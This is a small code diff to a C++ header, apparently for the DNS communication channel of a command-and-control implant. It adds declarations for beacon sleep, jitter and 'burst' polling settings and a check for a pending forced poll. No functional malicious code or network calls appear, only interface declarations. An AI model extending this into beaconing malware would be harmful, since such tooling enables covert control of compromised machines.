@@ -150,6 +150,10 @@ public:
     const BYTE* GetResolvers() const { return profile.resolvers; }
     void        UpdateResolvers(BYTE* resolvers);
 
+    void  UpdateBurstConfig(ULONG enabled, ULONG sleepMs, ULONG jitterPct);
+    void  GetBurstConfig(ULONG* enabled, ULONG* sleepMs, ULONG* jitterPct);
+    void  UpdateSleepDelay(ULONG sleepSeconds);
+
     BOOL  IsBusy() const;
     ULONG GetDownAckOffset() const { return downAckOffset; }
 
@@ -157,6 +161,7 @@ public:
                             BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
 
     void  ForcePollOnce() { this->forcePoll = TRUE; }
+    BOOL  IsForcePollPending() const { return this->forcePoll; }
 
     static void* operator new(size_t sz);
     static void operator delete(void* p) noexcept;
